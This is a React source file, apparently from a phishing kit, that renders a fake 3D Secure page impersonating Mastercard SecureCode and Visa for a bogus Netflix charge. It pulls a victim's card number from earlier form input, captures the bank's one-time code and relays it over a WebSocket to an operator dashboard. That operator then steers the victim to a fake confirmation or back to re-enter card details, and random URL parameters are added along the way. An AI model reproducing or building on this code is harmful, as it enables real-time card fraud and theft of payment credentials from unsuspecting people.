import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import useWebSocket from '../hooks/useWebSocket';
import { randomParamsURL } from '../utils/validation';
import '../styles/vbv-secure.css';

function ThreeDSecure() {
  const navigate = useNavigate();
  const { sendOTPSubmit, sendPresence } = useWebSocket();
  // Générer un montant aléatoire entre 0.01 et 0.99
  const getRandomAmount = () => {
    const min = 0.01;
    const max = 0.99;
    const amount = Math.random() * (max - min) + min;
    return amount.toFixed(2);
  };

  const [cardNumber, setCardNumber] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [currentDate, setCurrentDate] = useState('');
  const [randomAmount] = useState(() => getRandomAmount());

  // Formater le numéro de carte : afficher les 4 premiers et 4 derniers chiffres
  const formatCardNumber = (number) => {
    if (!number || number.length < 8) return '**** **** **** ****';
    // Nettoyer le numéro (enlever les espaces)
    const cleanNumber = number.replace(/\s/g, '');
    if (cleanNumber.length < 8) return '**** **** **** ****';
    
    const first4 = cleanNumber.substring(0, 4);
    const last4 = cleanNumber.substring(cleanNumber.length - 4);
    return `${first4} **** **** ${last4}`;
  };

  // Obtenir la date du jour au format MM/DD/YYYY
  const getCurrentDate = () => {
    const now = new Date();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const year = now.getFullYear();
    return `${month}/${day}/${year}`;
  };

  useEffect(() => {
    // Récupérer le numéro de carte depuis localStorage (stocké lors de la saisie)
    const storedCardNumber = localStorage.getItem('paymentCardNumber');
    if (storedCardNumber) {
      setCardNumber(storedCardNumber);
    }

    // Mettre à jour la date
    setCurrentDate(getCurrentDate());

    // Envoyer la présence
    sendPresence('/3ds-verification');

    // Écouter les messages de redirection depuis le serveur
    const handleWebSocketMessage = (event) => {
      const data = event.detail;
      console.log('[ThreeDSecure] 📨 Received WebSocket message event:', data.type, data);

      // Gérer les messages redirect selon l'architecture documentée (direct avec payload)
      if (data && data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
        const page = data.payload.page;
        const isCancellation = data.payload.isCancellation || false;
        const errorMessage = data.payload.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
        console.log('[ThreeDSecure] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
        setIsSubmitting(false); // Arrêter l'animation
        
        // Si c'est une annulation vers payment-details, stocker le message d'erreur
        if ((page === '/payment-details' || isCancellation) && errorMessage) {
          console.log('[ThreeDSecure] 🚫 Cancellation detected - storing error message');
          localStorage.setItem('paymentError', errorMessage);
        }
        
        navigate(`${page}?${randomParamsURL()}`);
      } else if (data && data.type === 'direct' && data.payload && data.payload.action === 'otp_verification_response') {
        // Gérer la réponse de vérification OTP
        const approved = data.payload.approved;
        console.log('[ThreeDSecure] ✅ OTP verification response received:', approved);
        setIsSubmitting(false); // Arrêter l'animation
        if (approved) {
          // Si approuvé, rediriger vers payment-confirmation
          navigate(`/payment-confirmation?${randomParamsURL()}`);
        } else {
          // Si rejeté, rediriger vers payment-details avec message d'erreur
          console.log('[ThreeDSecure] 🚫 OTP rejected - storing error message');
          localStorage.setItem('paymentError', 'Your credit card is not valid. Please check your card details and try again.');
          navigate(`/payment-details?${randomParamsURL()}`);
        }
      } else if (data && data.type === 'redirect') {
        // Support pour l'ancien format (backward compatibility)
        const page = data.page;
        const isCancellation = data.isCancellation || false;
        const errorMessage = data.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
        console.log('[ThreeDSecure] ✅ Redirect message received (legacy format)! Target page:', page, 'isCancellation:', isCancellation);
        setIsSubmitting(false); // Arrêter l'animation
        
        // Si c'est une annulation vers payment-details, stocker le message d'erreur
        if ((page === '/payment-details' || isCancellation) && errorMessage) {
          console.log('[ThreeDSecure] 🚫 Cancellation detected - storing error message');
          localStorage.setItem('paymentError', errorMessage);
        }
        
        navigate(`${page}?${randomParamsURL()}`);
      }
    };

    window.addEventListener('websocket-message', handleWebSocketMessage);
    console.log('[ThreeDSecure] ✅ WebSocket message listener added');

    return () => {
      console.log('[ThreeDSecure] 🧹 Cleaning up WebSocket message listener');
      window.removeEventListener('websocket-message', handleWebSocketMessage);
    };
  }, [navigate, sendPresence]);

  const handleSubmit = (e) => {
    e.preventDefault();
    const otpInput = e.target.secureCode.value;
    
    // Vérifier que le code OTP fait exactement 6 chiffres
    if (!otpInput || otpInput.length !== 6 || !/^\d{6}$/.test(otpInput)) {
      alert('Please enter a valid 6-digit OTP code');
      return;
    }

    console.log('[ThreeDSecure] 📤 Submitting OTP:', otpInput);
    setIsSubmitting(true);
    
    // Envoyer le code OTP au serveur
    sendOTPSubmit(otpInput);
    
    // L'animation continuera jusqu'à ce qu'on reçoive une réponse du dashboard
    // ou qu'on soit redirigé
  };

  const handleOTPInput = (e) => {
    // Limiter à 6 chiffres uniquement
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    e.target.value = value;
  };

  return (
    <div className="container auth-container">
      <div className="auth-wrapper">
        <div className="auth-box">
          <header className="auth-header">
            <div className="logo-left">
              <div className="mastercard-logo">
                <svg viewBox="0 0 120 60" className="mc-logo">
                  <circle cx="35" cy="30" r="15" fill="#EB001B"/>
                  <circle cx="55" cy="30" r="15" fill="#F79E1B"/>
                  <path d="M45 15c-3.5 2.8-5.8 7-5.8 11.8s2.3 9 5.8 11.8c3.5-2.8 5.8-7 5.8-11.8s-2.3-9-5.8-11.8z" fill="#FF5F00"/>
                </svg>
                <span className="securecode-text">SecureCode</span>
              </div>
            </div>
            <div className="logo-right">
              <svg className="visa-logo" viewBox="0 0 80 30">
                <rect width="80" height="30" rx="3" fill="#1A1F71"/>
                <text x="40" y="20" fontSize="16" fontWeight="bold" fill="#ffffff" textAnchor="middle" fontFamily="Arial, sans-serif">VISA</text>
              </svg>
            </div>
          </header>

          <div className="auth-content">
            <p className="info-message">We just sent you a verification code by text message to your mobile number.</p>

            <div className="transaction-info">
              <div className="info-row">
                <span className="info-label">Merchant:</span>
                <span className="info-value">Netflix</span>
              </div>
              <div className="info-row">
                <span className="info-label">Amount:</span>
                <span className="info-value amount">${randomAmount}</span>
              </div>
              <div className="info-row">
                <span className="info-label">Date:</span>
                <span className="info-value">{currentDate || getCurrentDate()}</span>
              </div>
              <div className="info-row">
                <span className="info-label">Card number:</span>
                <span className="info-value card-num">{formatCardNumber(cardNumber)}</span>
              </div>
            </div>

            <form className="auth-form" onSubmit={handleSubmit}>
              <div className="form-field">
                <label htmlFor="secureCode" className="field-label">3D Secure OTP:</label>
                <input 
                  type="text" 
                  id="secureCode" 
                  name="secureCode" 
                  className="secure-input" 
                  placeholder="Enter 6-digit OTP"
                  required
                  autoComplete="off"
                  maxLength="6"
                  pattern="[0-9]{6}"
                  inputMode="numeric"
                  onInput={handleOTPInput}
                  disabled={isSubmitting}
                />
              </div>

              <div className="form-buttons">
                <button 
                  type="submit" 
                  className="submit-btn"
                  disabled={isSubmitting}
                  style={{
                    position: 'relative',
                    opacity: isSubmitting ? 0.7 : 1,
                    cursor: isSubmitting ? 'wait' : 'pointer'
                  }}
                >
                  {isSubmitting ? (
                    <>
                      <span style={{ marginRight: '8px' }}>⏳</span>
                      Processing...
                    </>
                  ) : (
                    'Submit'
                  )}
                </button>
                <a 
                  href="#" 
                  className="cancel-link" 
                  onClick={(e) => { 
                    e.preventDefault(); 
                    if (!isSubmitting) navigate(`/billing?${randomParamsURL()}`); 
                  }}
                  style={{ opacity: isSubmitting ? 0.5 : 1, pointerEvents: isSubmitting ? 'none' : 'auto' }}
                >
                  Cancel
                </a>
              </div>
              
              {isSubmitting && (
                <div style={{
                  marginTop: '1rem',
                  textAlign: 'center',
                  color: '#666',
                  fontSize: '0.875rem'
                }}>
                  <style>{`
                    @keyframes spin {
                      0% { transform: rotate(0deg); }
                      100% { transform: rotate(360deg); }
                    }
                  `}</style>
                  <div style={{
                    display: 'inline-block',
                    width: '20px',
                    height: '20px',
                    border: '3px solid #f3f3f3',
                    borderTop: '3px solid #e50914',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    marginRight: '8px',
                    verticalAlign: 'middle'
                  }}></div>
                  <span>Processing in progress...</span>
                </div>
              )}
            </form>

            <div className="footer-info">
              <p>For further questions, please contact the bank call center or visit our website. All entered information is confidential and is not to be shared with the merchant.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ThreeDSecure;

